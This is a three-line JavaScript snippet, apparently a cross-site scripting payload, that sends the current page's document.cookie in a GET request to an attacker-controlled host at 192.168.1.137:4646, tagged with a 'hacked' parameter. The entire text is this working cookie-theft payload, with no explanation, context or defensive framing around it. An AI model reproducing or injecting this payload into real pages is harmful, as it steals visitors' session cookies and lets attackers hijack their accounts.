var request = new XMLHttpRequest();
request.open('GET','http://192.168.1.137:4646/?hacked=' + document.cookie);
request.send();
